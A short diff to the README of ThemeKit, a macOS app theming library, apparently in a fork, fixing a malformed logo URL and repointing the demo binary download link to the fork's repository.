@@ -1,5 +1,5 @@
 <p align="left" style="margin-top: 20px;">
-  <img src="https://https://github.com/Skovie/masOSThemKit/raw/master/Imgs/ThemeKit@2x.png" width="377" height="105" alt="ThemeKit" />
+  <img src="https://github.com/Skovie/masOSThemKit/raw/master/Imgs/ThemeKit@2x.png" width="377" height="105" alt="ThemeKit" />
 </p>
 
 ![macOS](https://img.shields.io/badge/os-macOS%2010.10%2B-green.svg?style=flat)
@@ -21,7 +21,7 @@
 
 ### QuickStart
 
-* Download the [ThemeKit Demo](https://github.com/luckymarmot/ThemeKit/raw/master/Demo/Bin/Demo.zip) binary and give it a try!
+* Download the [ThemeKit Demo](https://github.com/Skovie/masOSThemKit/raw/master/raw/master/Demo/Bin/Demo.zip) binary and give it a try!
 * Read the [Make your macOS app themable](https://medium.com/@nfgrilo/make-your-macos-app-themable-30dbfe4f5ef0) article (simple tutorial). 
 * Check the [ThemeKit Docs](http://themekit.nunogrilo.com). 
 
